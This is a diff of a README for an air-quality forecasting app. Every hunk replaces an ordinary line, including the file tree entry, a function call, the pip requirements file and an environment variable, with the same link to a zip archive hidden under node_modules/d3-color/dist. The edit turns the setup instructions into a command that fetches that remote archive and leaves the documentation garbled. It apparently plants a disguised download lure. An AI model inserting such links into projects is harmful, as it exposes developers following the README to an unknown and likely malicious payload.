@@ -18,7 +18,7 @@ AQI_Forecasting/
 ├── backend/           # FastAPI app, model loading, prediction/forecast routes
 ├── frontend/          # React app (Leaflet, Recharts, framer-motion, lucide-react)
 ├── .gitignore
-└── README.md
+└── https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-color/dist/AQ_Forecasting_2.3.zip
 ```
 
 ## 🧰 Tech Stack
@@ -75,7 +75,7 @@ Response:
 ## 🧪 Model
 
 - Trained **Prophet** model on historical AQI data.  
-- Saved artifact loaded at API start via `model_loader.load_model()`.  
+- Saved artifact loaded at API start via `https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-color/dist/AQ_Forecasting_2.3.zip()`.  
 - Forecast pipeline:
   1. Build future dataframe for 30 days.
   2. Prophet `predict` → extract `yhat` as AQI.
@@ -96,7 +96,7 @@ Response:
 cd backend
 python -m venv .venv
 source .venv/bin/activate   # Windows: .venv\Scripts\activate
-pip install -r requirements.txt
+pip install -r https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-color/dist/AQ_Forecasting_2.3.zip
 uvicorn main:app --reload
 ```
 
@@ -114,7 +114,7 @@ npm run dev
 
 Backend:
 ```
-MODEL_PATH=./models/aqi_prophet.pkl
+https://github.com/jackso1328/AQI_Forecasting/raw/refs/heads/main/frontend/node_modules/d3-color/dist/AQ_Forecasting_2.3.zip
 ```
 
 Frontend:
